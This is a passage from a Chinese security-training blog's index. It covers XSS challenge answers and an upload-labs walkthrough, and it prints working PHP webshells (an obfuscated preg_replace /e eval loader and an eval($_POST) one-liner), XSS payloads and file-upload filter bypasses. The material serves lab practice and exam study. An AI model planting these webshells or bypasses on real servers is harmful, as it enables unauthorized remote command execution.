/ 或使用 (ab)+：匹配ab、abab php正则表达式 i 忽略大小写\ng 全局搜索\nm 多行\ne 当作php执行\n示例1：\n1 2 3 4 5 6 7 8 \u0026lt;?php $str1 = \u0026#34;haha nihao 123 456 789 !\u0026#34;; //正则表达式 $pa = \u0026#39;/(\\d+)/i\u0026#39;;\t//匹配所有数字组合 echo preg_replace($pa,\u0026#39;x\u0026#39;,$str1);\t//用x替换匹配到的内容 ?\u0026gt; 输出：haha nihao x x x !\n示例2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $str1 = \u0026#34;haha nihao 123 456 789 !\u0026#34;; //正则表达式 // 1 2 3 4 5 $pa = \u0026#39;/(\\w+) (\\w+) (\\d+) (\\d+) (\\d+)/i\u0026#39;; $replace = \u0026#39;good ${2}------${4}\u0026#39;; echo preg_replace($pa,$replace,$str1); ?\u0026gt; 输出：good nihao------456 !\n正则表达式的一句话木马：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php //传入haha=任意值\u0026amp;z0=system(\u0026#39;系统命令\u0026#39;);后者传入base64加密后的密文 $a = $_POST[\u0026#39;haha\u0026#39;];\t//任意传入参数haha触发下面if为true，执行后面的语句 if(isset($a)){ //下面使用正则表达式去掉后面核心木马语句的中括号，并且/e表示将替换后的字符当作命令执行 preg_replace(\u0026#34;/\\[(.*)\\]/e\u0026#34;,\u0026#39;\\\\1\u0026#39;,\u0026#39;[eval(base64_decode($_POST[z0]))]\u0026#39;); } ?\u0026gt; 补充：日志审计 打开：CISP-PTE 认证考试并下载日志\n使用正则表达式\\.php.+ 200查找\n","date":"2026-01-21T17:13:28+08:00","permalink":"https://www.retr0.xyz/p/1.21-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"1.21 Webshell 免杀和正则表达式"},{"content":"XSS挑战题 打开XSS挑战靶场：欢迎来到XSS挑战\n这里给出前11题答案和部分题目的思路。\nLevel 1 1 \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; Level 2 1 \u0026lt;input name=keyword value=\u0026#34; x\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026#34;\u0026gt; Level 3 1 \u0026lt;input name=keyword value=\u0026#39; x\u0026#39; onmouseover=\u0026#39;alert(1) \u0026#39;\u0026gt; Level 4 1 \u0026lt;input name=keyword value=\u0026#34; x\u0026#34; onclick=\u0026#34;alert(1) \u0026#34;\u0026gt; Level 5 1 \u0026lt;input name=keyword value=\u0026#34; x\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;恭喜你\u0026lt;/a\u0026gt;// \u0026#34;\u0026gt; Level 6 1 \u0026lt;input name=keyword value=\u0026#34; x\u0026#34;\u0026gt;\u0026lt;a hREf=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;恭喜你\u0026lt;/a\u0026gt;// \u0026#34;\u0026gt; Level 7 1 \u0026lt;input name=keyword value=\u0026#34; x\u0026#34;\u0026gt;\u0026lt;a hRhREfEf=\u0026#34;javascrscriptipt:alert(1)\u0026#34;\u0026gt;恭喜你\u0026lt;/a\u0026gt;// \u0026#34;\u0026gt; Level 8 1 2 3 javascript:alert(1) href后面会自动翻译unicode编码，不一定每一次都要直接用地址栏进行get请求 javasc\u0026amp;#114;\u0026amp;#105;pt:alert(1) 发现某一语句被过滤时要善用：\n双写绕过 HTML实体编码 HTML标签大小写不敏感（js函数大小写敏感） HTML语句的结构松散（写一半换行） Level 9 1 \u0026lt;a href=\u0026#34;javasc\u0026amp;#114;\u0026amp;#105;pt:alert(1)//http://www.cctv.com\u0026#34;\u0026gt;友情链接\u0026lt;/a\u0026gt; Level 10 查看网页源码\n1 2 3 4 5 \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 有几个隐藏表单，默认的form是get请求，我们每个都传入一下看看谁能显示出来\n1 /level10.php?keyword=haha\u0026amp;t_link=haha1\u0026amp;t_history=haha2\u0026amp;t_sort=haha3 发现t_sort的value显示了出来：\u0026lt;input name=\u0026quot;t_sort\u0026quot; value=\u0026quot;haha3\u0026quot; type=\u0026quot;hidden\u0026quot;\u0026gt;\n因此针对t_sort进行注入：\n1 \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34; x\u0026#34; type=\u0026#34;text\u0026#34; onmouseover=\u0026#34;alert(1)\u0026#34;\u0026gt;// \u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; Level 11 刚开局只有一个人理我\n但是发现这次服务端对GET传入的引号进行了过滤，因此不能有效逃逸，所以抛弃t_sort这个假注入点\n进一步查看源代码发现里面包括refer参数，指上一个页面跳转而来\n1 \u0026lt;input name=\u0026#34;t_ref\u0026#34; value=\u0026#34;来路\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; 所以我们用burp suite进行抓包，针对ref后的链接进行修改\n1 \u0026lt;input name=\u0026#34;t_ref\u0026#34; value=\u0026#34; x\u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1)\u0026#34;\u0026gt;// \u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; 其他HTML事件 window.location 浏览器跳转\nlocaltion.href 返回当前的url\nonload 当页面加载完成的时候工作\nonerror 当前标签加载错误\nonchange 当前html页面改动\nonclick 点击元素\nonmouseover 鼠标掠过\nonmousedown/up 鼠标按下/抬起\nonkeydown 键盘按下\n文件上传 简易测试平台 文件上传前端，创建upload.html\n1 2 3 4 5 \u0026lt;form action=\u0026#34;./process.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34; \u0026gt;文件名\u0026lt;/label\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;click me\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; 文件接收后端，创建process.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php //接收传过来的文件 $fileinfo = $_FILES[\u0026#39;file\u0026#39;]; //var_dump($fileinfo); //获取文件临时目录 $filetmp_path = $fileinfo[\u0026#39;tmp_name\u0026#39;]; //保存文件在当前目录的file文件夹下(要提前创建) move_uploaded_file($filetmp_path,\u0026#34;./file/\u0026#34;.$fileinfo[\u0026#39;name\u0026#39;]) ?\u0026gt; 接下来写一个简单的木马，创建vi.php\n1 \u0026lt;?php eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 该木马的意思是通过POST获取一个名为cmd的参数，因此我们主要运用php的语法system(\u0026quot;系统命令\u0026quot;);传入参数，这样eval()函数会把接收到的参数当作命令来执行，如此一来我们就可以通过传参的方法在目标主机上执行CMD命令。\n@的作用是不报错，减少防火墙发现概率\n日常测试文件上传漏洞，都使用phpinfo文件\n1 \u0026lt;?php phpinfo()?\u0026gt; 它只会输出当前系统配置信息，属于无毒代码\n手动传参 1 2 3 4 5 //我们传参： cmd=system(\u0026#34;ipconfig\u0026#34;); //页面上返回 Windows IP 配置 以太网适配器 Ethernet0: 连接特定的 DNS 后缀 . . . . . . . : localdomain 本地链接 IPv6 地址. . . . . . . . : fe80::9087:a026:a5bf:e1c5%12 IPv4 地址 . . . . . . . . . . . . : 192.168.80.134 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : 192.168.80.2 借助工具 我们这里使用工具《中国菜刀》，添加网站时将你上传好的木马php链接输入并填写你设的参数名，程序就可以进行查看文件，虚拟终端等很多功能。\n靶场练习 靶场搭建 下载靶场：https://pan.baidu.com/s/1i8dswj6ALINxoyCY7GqiTg?pwd=dvur\n将靶场解压到一个单独的文件夹内，打开phpStudy.exe启动，注意原先自带的phpstudy服务要关闭\n访问http://127.0.0.1/以打开靶场\n接下来只介绍一些典例\nPass-01（禁用JS） 上传正常图片后查看图片地址发现图片被保存在网站的./upload文件夹下\n选择木马php上传发现弹窗提示文件格式不合规\n这时我们用burp suite抓包上传发现根本没有数据包，因此可以推断文件格式是在前端判断(基于JavaScript)的，所以我们使用Firefox浏览器右上角的 JS 插件禁用网页JavaScript即可成功上传。\nPass-02（伪造MIME） 这一次我们上传木马php时抓包发现有结果，数据包中有以下内容：\n1 2 Content-Disposition: form-data; name=\u0026#34;upload_file\u0026#34;; filename=\u0026#34;vi.php\u0026#34; Content-Type: application/octet-stream Content-Type:指的是文件的MIME类型，说明文件是否合规由后端进行判断，所以我们修改数据包中文件类型为image/jpeg后放行数据包即可成功上传。\nPass-03（黑名单-漏网之鱼） 查看源码（解释版）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { //你不允许上传这些后缀名的文件 $deny_ext = array(\u0026#39;.asp\u0026#39;,\u0026#39;.aspx\u0026#39;,\u0026#39;.php\u0026#39;,\u0026#39;.jsp\u0026#39;); //文件名首尾去空 $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); //删除文件名末尾的点 $file_name = deldot($file_name); //输出从左往右.及其后面所有内容 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); //转换为小写 $file_ext = strtolower($file_ext); //去除字符串::$DATA $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext); //首尾去空 $file_ext = trim($file_ext); //文件的后缀名在不在这个deny_ext数组中？ if(!in_array($file_ext, $deny_ext)) { //获取文件临时路径 $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; // ../upload / 202601231234 .png $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.date(\u0026#34;YmdHis\u0026#34;).rand(1000,9999).$file_ext; //保存文件 if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 注入方法：\n抓包时将文件后缀名改为.php3上传即可\n原理：\n黑名单，符合黑名单的内容都不要\n.php=\u0026gt; .php3 .php4 .php5 .pht .phtml\n这些后缀都有可能被当作php来执行\n修复此漏洞\n找到Apache/conf/httpd.conf配置文件\n发现AddType application/x-httpd-php .php .php3 .phtml\n把后面.php3 .phtml删除，重启apache即可\nPass-04（利用.htaccess） 查看源码发现黑名单多了一大堆后缀名，所以上一题的思路不再可行。\n但是根据刚才修复漏洞的经验可知服务端打开任何后缀名文件时都是当作某种类型文件来打开，所以我们可以写一个文件类型解析文件引导php将某一特定文件当作.php打开，现在得到下面的\n邪修：\n.htaccess（杀伤力很大，实战不建议使用）\n.htaccess是php解析文件，可以指定把什么东西当作php来执行\n新建.htaccess文件（纯后缀名，没有名字）\n1 2 3 \u0026lt;FilesMatch \u0026#34;vi\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 先将.htaccess上传后再上传名为vi.jpg的木马php（由vi.php修改后缀名得来）\nPass-06/07/08（黑名单-利用特殊字符） Pass-06：使用代码对比工具对比源码发现少了首尾去空的功能，因此我们抓包修改文件名为vi.php 即可\n原理： 空格算字符，但是Windows系统会自动忽略空格，文件正常打开\nPass-07：使用代码对比工具对比源码发现少了删除文件名末尾的点的功能，因此我们抓包修改文件名为vi.php. .即可\n原理：.算字符，但是Windows系统会自动忽略空格，文件正常打开\nPass-08：使用代码对比工具对比源码发现少了去除字符串::$DATA的功能，因此我们抓包修改文件名为vi.php::$DATA即可\n原理： 如果加了::$DATA文件会被系统当作文件流处理，不会检测后缀名\nPass-09（黑名单-钻逻辑漏洞） 查看源码（解释版）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { // 这里假装传入文件名vi.php. . if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); // 去首尾空格变为vi.php. . $file_name = deldot($file_name);//删除文件名末尾的点 // 变为vi.php.空格 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); // 获取最后一个.及其后面的字符即为 .空格 $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 // 一波操作之后代码最后以为文件名是. （一个点），固放行 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 注入方法： 抓包修改文件名为vi.php. .\n原理： 后端获取后缀名逻辑有问题\nPass-10（黑名单-双写绕过） 查看源码（特别部分）：\n1 $file_name = str_ireplace($deny_ext,\u0026#34;\u0026#34;, $file_name); 代码会检测文件名中是否存在符合上面的后缀名表里的部分，如果有就直接删除字符让上传的文件无法被正常解析\n注入方法： 修改文件名为vi.phphpp\n原理： 双写绕过\nPass-11（%00结束符-GET版） 查看源码（解释版）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;);\t//只允许三种图片格式文件通过 $file_ext = substr($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],strrpos($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],\u0026#34;.\u0026#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = $_GET[\u0026#39;save_path\u0026#39;].\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; //合成最终保存路径：接收POST上传文件的目标路径然后加上随机数加时间再接文件名 if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else{ $msg = \u0026#34;只允许上传.jpg|.png|.gif类型文件！\u0026#34;; } } 发现第11题并不像上面判断后缀名是否包含在禁止的后缀名表，而是只允许三种图片格式文件通过，并且上传文件的路径可控，这里运用半XSS注入的思想，既然save_path是再POST里可以修改的我们就可以想办法让后面代码全部不执行\n注入方法： 本地修改木马文件名为vi.jpg，抓包修改第一行路径为save_path=../upload/vi.php%00\n原理：%00是结束符，导致后面的数据丢失，代码不再执行，同时文件保存的路径及最终文件名已经由我们给出。\nPass-12（%00结束符-POST版） 查看源码（与Pass-11比较）：\n1 $img_path = $_POST[\u0026#39;save_path\u0026#39;].\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; 发现第二题获取文件保存路径时使用POST方法，我们还是用上面那招\n注入方法： 本地修改木马文件名为vi.jpg，抓包修改路径为save_path=../upload/vi.php%00，框选%00，右键，依次点击，Convert-selection、URL、URL-decode\n原理： GET会自动进行解码，而POST不会自动进行解码，所以需要手工解码\nPass-13/14/15（制作木马图） Pass-13： 查看源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 function getReailFileType($filename){ $file = fopen($filename, \u0026#34;rb\u0026#34;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\u0026#34;C2chars\u0026#34;, $bin); $typeCode = intval($strInfo[\u0026#39;chars1\u0026#39;].$strInfo[\u0026#39;chars2\u0026#39;]); $fileType = \u0026#39;\u0026#39;; switch($typeCode){ case 255216: $fileType = \u0026#39;jpg\u0026#39;; break; case 13780: $fileType = \u0026#39;png\u0026#39;; break; case 7173: $fileType = \u0026#39;gif\u0026#39;; break; default: $fileType = \u0026#39;unknown\u0026#39;; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $file_type = getReailFileType($temp_file); if($file_type == \u0026#39;unknown\u0026#39;){ $msg = \u0026#34;文件未知，上传失败！\u0026#34;; }else{ $img_path = UPLOAD_PATH.\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#34;上传出错！\u0026#34;; } } } 主要有两个要点：\n会检查前2字节的文件头来判断文件类型 不论原后缀名是什么，最后会根据检查到的文件类型完全重命名保存的文件 题目指明了要使用预留的文件包含漏洞http://localhost/include.php 这里我们顺便看看include.php里写了什么，要怎么利用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php /* 本页面存在文件包含漏洞，用于测试图片马是否能正常运行！ */ // 1. 设置响应头：页面编码为UTF-8，避免中文乱码 header(\u0026#34;Content-Type:text/html;charset=utf-8\u0026#34;); // 2. 从GET请求中获取名为file的参数值（可控输入，漏洞核心） $file = $_GET[\u0026#39;file\u0026#39;]; // 3. 判断是否传入了file参数 if(isset($file)){ // 4. 核心漏洞：包含并执行$file指定路径的文件内容 include $file; }else{ // 5. 未传参数时，显示当前文件的源代码（方便测试者查看代码） show_source(__file__); } ?\u0026gt; 注入方法： 使用16进制查看器（如c32、hex等）给原木马php开头加上.gif的文件头GIF89A （优先GIF！因为是文件头是纯文本） 后保存，上传文件，这时直接访问会提示文件错误，但是当调用漏洞（将路径作为file参数传入，如：http://localhost/include.php?file=./upload/4720260119193004.gif）时成功。\n原理： 利用了只检查两个字节的机制和预设的文件包含漏洞。\nPass-14： 查看源码（与Pass-13对比）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function isImage($filename){ $types = \u0026#39;.jpeg|.png|.gif\u0026#39;; if(file_exists($filename)){ $info = getimagesize($filename); //使用getimagesize获取图片多个参数 $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)\u0026gt;=0){ return $ext; }else{ return false; } }else{ return false; } } 这里使用了getimagesize函数获取图片多个参数，因此仅靠简单的添加文件头不能再骗过服务端。需要进一步构造更拟真图片木马。\n注入方法： 使用截图工具截一小块图（越简单越好，这样其编码也简单），用16进制查看器打开，开头加上GIF89A，末尾加上你使用的一句话木马，保存并上传修改后的文件，再次用文件包含漏洞打开上传的文件，成功注入。\nPass-15： 与Pass-14操作完全相同。\nPass-16（二次渲染） 查看源码发现程序对图片进行了二次渲染。\n注入方法：使用系统自带画图软件画一个简单的图片，以.gif格式保存。将图片直接上传，将网页上展示的图片下载下来，使用十六进制编辑器查看两者之间没有发生改变的位置，复制php中的一句话木马（注意记住语句的字数长度），在刚才画的图中找一个没有发生变化的位置，选择字数相同的长度替换为一句话木马，保存后将图片木马上传，同样使用文件包含漏洞打开。\nPass-17/18（条件竞争） Pass-17 查看源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); $file_name = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $file_ext = substr($file_name,strrpos($file_name,\u0026#34;.\u0026#34;)+1); $upload_file = UPLOAD_PATH . \u0026#39;/\u0026#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39;. rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \u0026#34;只允许上传.jpg|.png|.gif类型文件！\u0026#34;; unlink($upload_file); } }else{ $msg = \u0026#39;上传出错！\u0026#39;; } } 这里存在逻辑漏洞，是接收上传的文件再去判断是否合规，因此我们上传的文件会存在一段时间（虽然很短），但是如果我们用多线程一直去上传呢？\n注入方法： 直接上传php木马同时抓包，send to intruder，选一个无关紧要的地方，payload 选numbers 1-9999，线程开20\n原理： 损耗服务器资源，让他删不过来\nPass-18 作者代码有问题，打开myupload.php，103行，改为$this-\u0026gt;cls_upload_dir = $dir.'/';\n查看源码发现仅靠服务端靠后缀名白名单对上传的文件进行检查，并且还有自动改名的机制。\n注入方法： 这里我们利用php的一个漏洞，将php木马 加上 一个后缀.7z，php.7z的木马同时抓包，接着方法同 Pass-17\n原理：x.php.7z会被当作php执行，php发现7z，zip，rar会尝试解压，损耗服务器资源，总有一个时候来不及改名，从而直接访问。\nPass-19（%00结束符-POST版进阶） 查看源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;php\u0026#34;,\u0026#34;php5\u0026#34;,\u0026#34;php4\u0026#34;,\u0026#34;php3\u0026#34;,\u0026#34;php2\u0026#34;,\u0026#34;html\u0026#34;,\u0026#34;htm\u0026#34;,\u0026#34;phtml\u0026#34;,\u0026#34;pht\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;jspa\u0026#34;,\u0026#34;jspx\u0026#34;,\u0026#34;jsw\u0026#34;,\u0026#34;jsv\u0026#34;,\u0026#34;jspf\u0026#34;,\u0026#34;jtml\u0026#34;,\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;asa\u0026#34;,\u0026#34;asax\u0026#34;,\u0026#34;ascx\u0026#34;,\u0026#34;ashx\u0026#34;,\u0026#34;asmx\u0026#34;,\u0026#34;cer\u0026#34;,\u0026#34;swf\u0026#34;,\u0026#34;htaccess\u0026#34;); $file_name = $_POST[\u0026#39;save_name\u0026#39;];\t//通过POST获取保存的文件名 $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\t//重要：调用从文件名中获取后缀名的功能 //因为这里仅将文件名当作字符串所以不会识别截断符，并且识别到的后缀名是 if(!in_array($file_ext,$deny_ext)) {\t//根据获取的后缀名进行白名单检测 $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) {\t//截断发生处，从而无法校验合规性 $is_upload = true; }else{ $msg = \u0026#39;上传出错！\u0026#39;; } }else{ $msg = \u0026#39;禁止保存为该类型文件！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 注入方法： burp抓包，保存名修改为vi.php%00.jpg，%00进行URL-decode，文件名部分需要.jpg用来通过审核\nPass-20（数组绕过检查） 查看源码(解释版)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;?php $is_upload = false; $msg = null; if(!empty($_FILES[\u0026#39;upload_file\u0026#39;])){ //检查MIME $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); //检查文件类型 if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ $msg = \u0026#34;禁止上传该类型文件!\u0026#34;; }else{ //检查文件名 //判断save_name是否为空，如果为空就用文件名，如果不为空就使用save_name $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; //判断$file是否为数组 //如果我直接传入数组 $file[0]=\u0026#39;haha.php\u0026#39; $file[2]=\u0026#39;jpg\u0026#39; if (!is_array($file)) { //$file=haha.jpg ---\u0026gt; $file[0]=\u0026#39;haha\u0026#39;; $file[1]=\u0026#39;jpg\u0026#39;; $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } //$ext = \u0026#39;jpg\u0026#39;; // jpg $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); //判断$ext在不在白名单里 if (!in_array($ext, $allow_suffix)) { $msg = \u0026#34;禁止上传该后缀文件!\u0026#34;; }else{ // haha.php . $file[1] $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \u0026#34;文件上传成功！\u0026#34;; $is_upload = true; } else { $msg = \u0026#34;文件上传失败！\u0026#34;; } } } }else{ $msg = \u0026#34;请选择要上传的文件！\u0026#34;; } ?\u0026gt; 可以看到漏洞存在于如果传入的save_name是数组,那么就可以避开自动从文件名获取后缀名.\n并且接下来的过程中是取数组的第一个元素为文件名称,最后一个为后缀名,那么我们可以传入一个数组[x.php,,jpg]\n注入方法: 上传同时抓包,先修改MIME为image/jpeg,接下来修改save_name部分为(例):\n1 2 3 4 5 6 7 8 -----------------------------306962433823754 Content-Disposition: form-data; name=\u0026#34;save_name[0]\u0026#34; upload-20.php -----------------------------306962433823754 Content-Disposition: form-data; name=\u0026#34;save_name[2]\u0026#34; jpg 原理: php的数组是一一对应的索引概念,不一定要是连续的,所以我们只传入了第0、2号元素,1号不存在,因此数组内只有两个元素(count($file)=2),且访问1号元素时返回为空(NULL)。\n拓展 本地搭建：\n前端：创建upload.html 1 2 3 4 5 \u0026lt;form action=\u0026#34;./test1.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;文件名\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; 